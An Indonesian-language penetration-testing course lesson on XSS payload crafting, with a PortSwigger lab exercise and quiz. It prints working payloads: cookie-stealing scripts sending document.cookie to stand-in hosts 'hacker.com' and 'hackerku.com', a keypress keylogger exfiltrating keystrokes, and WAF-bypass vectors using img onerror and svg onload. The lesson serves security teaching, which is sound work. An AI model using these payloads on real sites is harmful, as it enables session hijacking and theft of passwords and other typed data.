# 💀 Week 17 · Day 1: XSS (Payload Crafting & Cookie Stealing)

> **Rank**: BREACH | **Minggu ke-17**, Hari 1/5 | **Durasi**: ~45 menit

📊 **Progress**: Week 17 · Day 1/5 | BREACH Rank (Minggu 3 dari 5) | Overall: 81/120 hari (68%)

---

## 🎯 Tujuan Hari Ini

Setelah menyelesaikan materi hari ini, kamu akan mampu:

1. **Merakit** kode *JavaScript* khusus untuk eksploitasi tingkat lanjut (*Payload Crafting*).
2. **Mengeksploitasi** dan mencuri *Session Cookie* milik pengguna lain.
3. **Mensimulasikan** skrip penyadapan tombol papan ketik (*Keylogging*) menggunakan XSS.

---

## 📖 Materi Inti

### Seni Meracik Payload XSS (Payload Crafting)

Pada Rank *Forge* (Minggu 14), kamu telah mempelajari konsep dasar *XSS (Cross-Site Scripting)*, yaitu celah keamanan di mana aplikasi web mengeksekusi kode *JavaScript* berbahaya yang disisipkan oleh penyerang (biasanya didemonstrasikan dengan *pop-up* peringatan `alert(1)`).

Bagi *Pentester* di tingkat *Breach Rank*, memunculkan *pop-up* tersebut barulah langkah awal (*Proof of Concept*). Jika kita sudah berhasil memaksa *browser* korban mengeksekusi kode *JavaScript*, langkah selanjutnya adalah membuat kode tersebut melakukan tindakan berbahaya secara otomatis! Skrip *JavaScript* yang dirancang khusus untuk mencuri data atau mengeksploitasi korban ini disebut sebagai **Payload**.

### 1. Merampas Sesi Otentikasi (Cookie Stealing)

*Session Cookie* berfungsi sebagai tiket identitas *login*. Jika *Cookie* seorang Administrator berhasil dicuri, penyerang bisa mengambil alih akun Admin tersebut tanpa perlu mengetahui kata sandinya! Hal ini sangat rentan terjadi jika pengembang web tidak mengamankan *Cookie* dengan *flag* `HttpOnly`.

Asumsikan penyerang (*Hacker*) memiliki server penampung data di `hacker.com/curi`.
Penyerang menyusupkan *Payload XSS* ini ke dalam kolom Komentar di situs korban:

```html
<script>
  // Mengambil cookie korban lalu mengirimkannya ke server penyerang
  fetch('http://hacker.com/curi?kuki=' + document.cookie);
</script>
```

Ketika Administrator membaca komentar tersebut, *browser* sang Admin akan secara otomatis mengeksekusi skrip tersebut, menyedot *Cookie*-nya sendiri, lalu mengirimkannya ke server penyerang di belakang layar secara diam-diam!

### 2. Penyadapan Pengetikan (XSS Keylogging)

Bagaimana jika keamanan server target memblokir ekstraksi *Cookie*? Penyerang bisa mengubah strateginya menjadi: menyadap semua yang diketik oleh korban (*Keylogger*)!

Penyerang meracik *Payload Keylogger* menggunakan XSS:

```html
<script>
  // Merekam setiap tombol yang ditekan korban di halaman web tersebut
  document.addEventListener('keypress', function(e) {
    fetch('http://hacker.com/curi_huruf?ketik=' + e.key);
  });
</script>
```

Begitu skrip ini dimuat, setiap kali Administrator mengetikkan sesuatu (misalnya kata sandi, pesan rahasia, atau nomor kartu kredit) di halaman tersebut, huruf demi huruf yang diketik akan langsung terkirim ke server penyerang. Ini adalah salah satu dampak paling fatal dari kerentanan XSS.

### Merobek Perisai Penapisan WAF (WAF Bypass)

Terkadang, sistem pertahanan web (*Web Application Firewall / WAF*) sudah cukup pintar untuk mendeteksi dan memblokir tag `<script>`. Untuk mengakalinya, penyerang menyisipkan *JavaScript* menggunakan atribut *event handler* dari tag HTML biasa, seperti tag gambar (`<img>`) atau vektor grafis (`<svg>`):

- `<img src="x" onerror="alert(document.cookie)">` 
  *(Logika: Perintahkan browser memuat gambar palsu "x". Saat pemuatan gambar itu gagal/error, eksekusi perintah JavaScript di dalam `onerror`!)*
- `<svg onload=alert(1)>`
  *(Logika: Saat elemen grafis SVG selesai dimuat, eksekusi JavaScript).*

---

## 🧪 Mini Lab

**Durasi**: ~10 menit

Mari menyimulasikan penyusunan *Payload* penyedot *Cookie*!

1. Kunjungi ekosistem *PortSwigger XSS Labs*.
2. Asumsikan kamu sedang menguji celah *Stored XSS* di halaman komentar situs.
3. Aplikasi target ternyata menggunakan sistem filter (*WAF*) yang memblokir tag `<script>`.
4. Rakitlah sebuah *Payload* alternatif memanfaatkan fungsi `onerror` pada tag gambar:
  `<img src="salah" onerror="document.location='http://hackerku.com/curi?kuki='+document.cookie">`
5. Ketika Administrator memuat laman komentar tersebut, *browser*-nya akan mencari gambar "salah". Karena gambar tersebut tidak ada, fitur `onerror` akan aktif dan memaksa *browser* Administrator beralih halaman (*redirect*) ke situs penyerang sambil mengirimkan *Cookie*-nya melalui URL.

---

## 💡 Quiz Kilat

<details>
<summary>❓ Meskipun pop-up <code>alert(1)</code> populer untuk membuktikan kerentanan XSS, apa bentuk eksploitasi serangan nyata (yang berbahaya) yang paling sering dilakukan menggunakan XSS?</summary>

**Jawaban:** Pencurian identitas Sesi Login / Pencurian *Cookie* (*Cookie Stealing*).
</details>

<details>
<summary>❓ Pada eksploitasi <i>XSS Keylogging</i>, fitur <i>JavaScript</i> apa yang dimanfaatkan oleh penyerang untuk menyadap setiap ketikan pengguna di layar?</summary>

**Jawaban:** Fitur pendeteksi *Event Listener* pada *Keyboard*, seperti `keypress`, `keyup`, atau `keydown`.
</details>

<details>
<summary>❓ Jika WAF target langsung memblokir semua input yang mengandung tag <code>&lt;script&gt;</code>, taktik *bypass* apa yang digunakan penyerang untuk tetap bisa mengeksekusi *JavaScript*?</summary>

**Jawaban:** Penyerang menyisipkan *JavaScript* ke dalam *Event Handler* dari tag HTML lain (seperti tag `<img onerror=...>` atau `<svg onload=...>`).
</details>

---

## 📋 Checklist Hari Ini

- [ ] Saya memahami perbedaan antara *Proof of Concept* sederhana (`alert(1)`) dan *Payload Crafting*.
- [ ] Saya mengerti cara kerja *Payload* pencurian *Cookie*.
- [ ] Saya memahami konsep penyadapan tombol menggunakan *XSS Keylogger*.
- [ ] Saya menguasai taktik *bypass* WAF menggunakan tag `<img onerror=>`.
- [ ] Saya telah menjawab evaluasi seluruh *Quiz Kilat* dengan tepat.

---

## 🔗 Resources

- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) — Repositori populer yang berisi ratusan referensi *Payload* XSS untuk *bypass* WAF.

---

## ➡️ Besok

**Day 2: CSRF & SSRF** — Kalau serangan *XSS* menyisipkan *JavaScript* untuk mencuri data dari *browser* korban, esok hari kamu akan mempelajari trik untuk **mengendalikan** tindakan korban! Melalui kerentanan **CSRF (Cross-Site Request Forgery)**, kamu bisa memaksa *browser* korban (yang sedang *login*) untuk mengubah kata sandinya sendiri atau bahkan mentransfer uang, tanpa korban sadari. Bersiaplah mengeksploitasi sisi pengguna web di tingkat selanjutnya!

---

*📅 TISS Null Teaming · Week 17 · Day 1 · BREACH Rank*
